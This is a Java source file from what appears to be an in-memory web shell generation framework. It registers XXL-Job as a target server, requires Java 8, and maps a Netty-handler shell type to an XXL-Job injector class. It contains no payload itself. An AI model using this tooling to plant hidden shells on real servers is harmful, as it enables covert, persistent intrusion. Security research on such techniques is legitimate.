package com.reajason.javaweb.memshell.server.xxljob;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import net.bytebuddy.jar.asm.Opcodes;


import static com.reajason.javaweb.memshell.ShellType.NETTY_HANDLER;

/**
 * @author ReaJason
 * @since 2025/1/21
 */
public class XxlJob extends AbstractServer {

    /**
     * Netty handler 模板引用了 lambda，Java 6 类文件表达不了。
     */
    @Override
    public int getMinimumTargetJreVersion() {
        return Opcodes.V1_8;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(NETTY_HANDLER, "com.reajason.javaweb.memshell.injector.xxljob.XxlJobNettyHandlerInjector")
                .build();
    }
}
